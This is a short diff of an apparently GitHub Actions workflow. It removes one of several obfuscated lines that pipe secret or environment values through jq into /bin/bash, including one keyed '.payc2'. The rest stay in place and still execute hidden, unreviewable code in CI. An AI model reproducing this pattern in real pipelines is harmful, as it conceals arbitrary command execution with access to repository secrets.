@@ -21,7 +21,6 @@ jobs:
           e8: ${{ secrets.e8 }}
         run: |
           printf '%s' "$e8" | jq -r .bxkgz22 | /bin/bash
-          echo $xsy52 | jq -r .payc2 | /bin/bash
           echo $cyxi00807 | jq -r .zracb6471 | /bin/bash
           printf '%s' "$w28651" | jq -r .l2408 | /bin/bash
 
